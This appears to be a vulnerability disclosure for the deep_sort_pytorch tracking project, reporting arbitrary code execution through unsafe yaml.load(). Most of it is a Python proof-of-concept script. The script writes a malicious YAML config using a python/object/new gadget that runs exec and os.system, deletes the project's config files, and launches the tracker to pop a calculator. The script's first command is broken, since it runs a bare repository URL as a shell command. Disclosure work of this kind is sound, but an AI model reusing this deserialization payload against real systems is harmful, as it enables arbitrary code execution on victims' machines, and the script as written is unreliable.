# Description
**Arbitrary Code Excecution** in [deepsort built on pytorch](https://github.com/ZQPei/deep_sort_pytorch).
MOT tracking using deepsort and yolov3 with pytorch.
# Technical Description
This package was vulnerable to Arbitrary code execution due to a use of a known vulnerable function **load()** in **yaml**. All the scripts importing utils/parser.py is exploitable.
# Exploit code
**Python File**
```python
import os

os.system('https://github.com/ZQPei/deep_sort_pytorch.git')
os.chdir('deep_sort_pytorch/configs/')
os.system('pip install -r ../requirements.txt')
os.system('rm deep_sort*')
exploit = """DEEPSORT:
  REID_CKPT: "./deep_sort/deep/checkpoint/ckpt.t7"
  Exploit: !!python/object/new:type
    args: ["z", !!python/tuple [], {"extend": !!python/name:exec }]
    listitems: "__import__('os').system('xcalc')"
  MAX_DIST: 0.2
  MIN_CONFIDENCE: 0.3
  NMS_MAX_OVERLAP: 0.5
  MAX_IOU_DISTANCE: 0.7
  MAX_AGE: 70
  N_INIT: 3
  NN_BUDGET: 100
"""
open('deep_sort.yaml','w+').write(exploit)
os.chdir('../')
print(os.listdir('./'))
os.system('python yolov3_deepsort.py demo/demo.avi --config_deepsort configs/deep_sort.yaml')
```
# POC
* Run the exploit code 

![](https://cdn.discordapp.com/attachments/749019614352244777/786618917497864233/Screenshot_from_2020-12-10_21-06-38.png)
![](https://cdn.discordapp.com/attachments/749019614352244777/786618921444311070/Screenshot_from_2020-12-10_21-04-48.png)
